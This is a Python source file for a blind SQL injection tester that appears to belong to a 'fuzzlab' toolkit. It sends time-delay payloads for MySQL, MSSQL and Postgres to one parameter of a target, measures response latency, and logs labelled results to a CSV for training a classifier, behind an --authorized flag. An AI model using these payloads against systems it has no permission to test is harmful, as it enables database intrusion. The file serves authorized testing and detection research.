#!/usr/bin/env python3
"""
Time-based blind SQL injection detector and dataset builder.

AUTHORIZED USE ONLY
-------------------
Run this only against systems you own or have explicit, written permission to
test, e.g. a local DVWA or Mutillidae lab. There is no default target: you must
pass --url and the --authorized acknowledgement flag, so the tool can never fire
at something by accident.

What it does
------------
Sends a catalog of payloads to one request parameter, measures response latency
against a per-target baseline, and records observations to a CSV suitable for
training a response classifier. Detection is based purely on measured timing, so
the ground-truth label is not derived from the payload's own class (see NOTE).

Dependencies: requests  (pip install requests)
"""

import argparse
import csv
import random
import statistics
import sys
import time
from datetime import datetime, timezone

try:
    import requests  # the original script used requests but never imported it
except ImportError:
    sys.exit("This tool requires the 'requests' package: pip install requests")

from fuzzlab.core import get_logger
from fuzzlab.tools.authhttp import with_query_param


# --- Request senders -------------------------------------------------------
# Both expose get(url, param, value, timeout) -> (latency_seconds, status, size).
class RequestsSender:
    """Standalone path: a raw requests.Session (unauthenticated, unchanged behavior)."""

    def __init__(self, session):
        self._session = session

    def get(self, url, param, value, timeout):
        start = time.perf_counter()
        try:
            # allow_redirects=False (BUG-0044/PA-0046 sweep): a followed
            # redirect adds an extra, unrelated round trip into the
            # measured elapsed time -- exactly the kind of client default
            # PA-0030 already forbids silently applying to a timing-
            # sensitive real response.
            resp = self._session.get(url, params={param: value}, timeout=timeout,
                                      allow_redirects=False)
            return time.perf_counter() - start, resp.status_code, len(resp.text)
        except requests.Timeout:
            return float(timeout), 504, 0


class SeamSender:
    """Authenticated path: routes through the core HTTP seam + session manager.

    Timing is measured by the seam (which also serializes timing-sensitive requests
    per host via the budget mutex) and the session is attached by the manager.
    """

    def __init__(self, client, identity):
        self._client = client
        self._identity = identity

    def get(self, url, param, value, timeout):
        from fuzzlab.core.http import Request

        req = Request("GET", with_query_param(url, param, value),
                      identity=self._identity, timing=True, component="fuzzer")
        try:
            resp = self._client.send(req)
        except requests.Timeout:
            return float(timeout), 504, 0
        return resp.elapsed_ms / 1000.0, resp.status, len(resp.body)


# --- Payload catalog -------------------------------------------------------
# expected_delay is the sleep (seconds) the payload attempts to induce.
PAYLOADS = [
    {"text": "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)", "family": "mysql-inline",  "is_malicious": 1, "expected_delay": 5},
    {"text": "1' AND (SELECT 5 FROM (SELECT(SLEEP(5)))x)--", "family": "mysql-quote", "is_malicious": 1, "expected_delay": 5},
    {"text": "1; WAITFOR DELAY '0:0:5'--",                  "family": "mssql",         "is_malicious": 1, "expected_delay": 5},
    {"text": "admin' OR pg_sleep(5)--",                     "family": "postgres",      "is_malicious": 1, "expected_delay": 5},
    # Benign controls: these should never be flagged. If they are, your
    # threshold is too low or the target is unstable.
    {"text": "1",        "family": "benign", "is_malicious": 0, "expected_delay": 0},
    {"text": "25",       "family": "benign", "is_malicious": 0, "expected_delay": 0},
    {"text": "78",       "family": "benign", "is_malicious": 0, "expected_delay": 0},
    {"text": "username", "family": "benign", "is_malicious": 0, "expected_delay": 0},
]


def establish_baseline(sender, url, param, iterations, timeout):
    """Measure normal latency and body size to resist jitter-driven false positives."""
    print(f"[*] Baselining target over {iterations} requests...")
    times, sizes = [], []
    for _ in range(iterations):
        try:
            latency, status, size = sender.get(
                url, param, random.randint(1, 100), timeout
            )
        except requests.RequestException:
            continue
        if status == 504:
            continue
        times.append(latency)
        sizes.append(size)

    if not times:
        raise ConnectionError("Could not reach the target to establish a baseline.")

    baseline = {
        "avg_time": statistics.mean(times),
        "std_dev_time": statistics.stdev(times) if len(times) > 1 else 0.1,
        "avg_size": statistics.mean(sizes),
        "samples": len(times),
    }
    print(
        f"[+] Baseline: avg={baseline['avg_time']:.4f}s "
        f"stddev={baseline['std_dev_time']:.4f}s "
        f"avg_size={baseline['avg_size']:.0f}B (n={baseline['samples']})"
    )
    return baseline


def run_fuzzing_cycle(sender, url, param, baseline, payloads, args):
    """Execute payloads and classify by measured timing (label-independent)."""
    rows = []
    # A hit needs a clear multi-second delay AND to clear the jitter band.
    jitter_band = baseline["avg_time"] + args.sigma * baseline["std_dev_time"]

    print("\n[*] Starting active test cycle...")
    for item in payloads:
        payload = item["text"]

        # Measure the payload a few times and take the median to resist jitter.
        latencies, status, size = [], None, None
        for _ in range(args.repeats):
            try:
                latency, status, size = sender.get(
                    url, param, payload, args.timeout
                )
            except requests.RequestException as exc:
                print(f"[-] Request error on {payload[:24]!r}: {exc}")
                latency = None
                break
            latencies.append(latency)
            time.sleep(args.pause)

        if not latencies:
            continue

        median_latency = statistics.median(latencies)
        observed_delay = median_latency - baseline["avg_time"]

        # NOTE: detection is derived only from timing, not from is_malicious.
        # A payload is flagged when the induced delay is both large in absolute
        # terms (min_delay) and well outside normal jitter (jitter_band).
        detected = median_latency >= max(jitter_band, baseline["avg_time"] + args.min_delay)

        # Relationship to the labelled class, for evaluation only.
        if detected and item["is_malicious"]:
            outcome = "true_positive"
        elif detected and not item["is_malicious"]:
            outcome = "false_positive"
        elif not detected and item["is_malicious"]:
            outcome = "false_negative"
        else:
            outcome = "true_negative"

        print(
            f"{payload:<45} | status={status} "
            f"| median={median_latency:6.2f}s | delay={observed_delay:+6.2f}s "
            f"| detected={int(detected)} | {outcome}"
        )

        rows.append({
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target_url": url,
            "target_param": param,
            "fuzzed_input_payload": payload,
            "payload_family": item["family"],
            "server_response_status": status,
            "server_response_length": size,
            "observed_latency_seconds": round(median_latency, 4),
            "latency_delta_seconds": round(observed_delay, 4),
            "size_delta_bytes": int(size - baseline["avg_size"]),
            "repeats": len(latencies),
            "is_malicious_payload": item["is_malicious"],   # input label
            "time_delay_detected": int(detected),            # timing-only signal
            "eval_outcome": outcome,                          # label vs detection
        })
    return rows


def save_dataset(rows, filename):
    if not rows:
        print("[-] No rows collected; nothing written.")
        return
    with open(filename, "w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)
    print(f"\n[+] Logged {len(rows)} observations to {filename!r}")


def build_parser():
    p = argparse.ArgumentParser(prog="fuzzlab fuzz", description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--url", required=True, help="Target URL, e.g. http://localhost:8080/api/users")
    p.add_argument("--param", default="id", help="Request parameter to fuzz (default: id)")
    p.add_argument("--output", default="blind_sqli_dataset.csv", help="CSV output path")
    p.add_argument("--baseline-iterations", type=int, default=10, help="Baseline requests (default: 10)")
    p.add_argument("--repeats", type=int, default=2, help="Measurements per payload; median is used (default: 2)")
    p.add_argument("--sigma", type=float, default=3.0, help="Jitter band width in stddevs (default: 3)")
    p.add_argument("--min-delay", type=float, default=2.0,
                   help="Minimum absolute added delay (s) to count as a hit (default: 2)")
    p.add_argument("--pause", type=float, default=0.5, help="Seconds between requests (default: 0.5)")
    p.add_argument("--timeout", type=float, default=15.0, help="Per-request timeout (s); keep it > max sleep")
    p.add_argument("--authorized", action="store_true",
                   help="Required. Affirms you are authorized to test --url.")
    p.add_argument("--store", default=None,
                   help="Also consolidate attempts/findings into the unified fuzzlab store at this path.")
    p.add_argument("--identity", default=None,
                   help="Authenticate as this identity via the session manager "
                        "(needs saved credentials: `fuzzlab session set-credential`). "
                        "Omit to run unauthenticated.")
    from fuzzlab.cli_dryrun import add_dry_run_flag
    add_dry_run_flag(p)
    return p


def parse_args(argv=None):
    return build_parser().parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    if args.dry_run:
        from fuzzlab.cli_dryrun import report
        report("fuzz", args)
        return 0
    if not args.authorized:
        sys.exit("Refusing to run without --authorized. Only test systems you own or may test.")

    get_logger("fuzzer").info("fuzzer starting",
                              extra={"url": args.url, "param": args.param,
                                     "identity": args.identity})

    if args.identity:
        from fuzzlab.tools.authhttp import make_authenticated_client
        client = make_authenticated_client(args.url, args.identity, args.timeout,
                                           store_path=args.store)
        sender = SeamSender(client, args.identity)
    else:
        # Realistic browser UA, same rationale/constant as the crawler (BUG-0059).
        from fuzzlab.core.http import DEFAULT_USER_AGENT
        _session = requests.Session()
        _session.headers.update({"User-Agent": DEFAULT_USER_AGENT})
        sender = RequestsSender(_session)

    try:
        baseline = establish_baseline(
            sender, args.url, args.param, args.baseline_iterations, args.timeout
        )
        rows = run_fuzzing_cycle(sender, args.url, args.param, baseline, PAYLOADS, args)
        save_dataset(rows, args.output)
        if args.store:
            from fuzzlab.core.config import load_config
            from fuzzlab.core.store import Store
            from fuzzlab.oracle import Candidate, Oracle
            from fuzzlab.tools import store_adapter
            from fuzzlab.tools.probesender import make_probe_sender
            with Store(args.store) as store:
                run_id = store.start_run("fuzzer", load_config().hash())
                counts = store_adapter.import_fuzz_csv(args.output, store, run_id)
                # Deterministic confirmation: the oracle is the sole finding-writer,
                # replacing the fuzzer's provisional timing-only findings.
                probe = make_probe_sender(args.url, args.identity, args.timeout)
                oracle = Oracle(store=store, run_id=run_id)
                verdict = oracle.confirm(
                    Candidate(url=args.url, param=args.param, vuln_class="sqli"), probe)
            get_logger("fuzzer").info(
                "consolidated into store",
                extra={**counts, "confirmed": bool(verdict),
                       "mechanism": verdict.mechanism if verdict else None})
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user.")
    except Exception as exc:  # noqa: BLE001 - top-level guard
        sys.exit(f"[!] Critical error: {exc}")


if __name__ == "__main__":
    main()
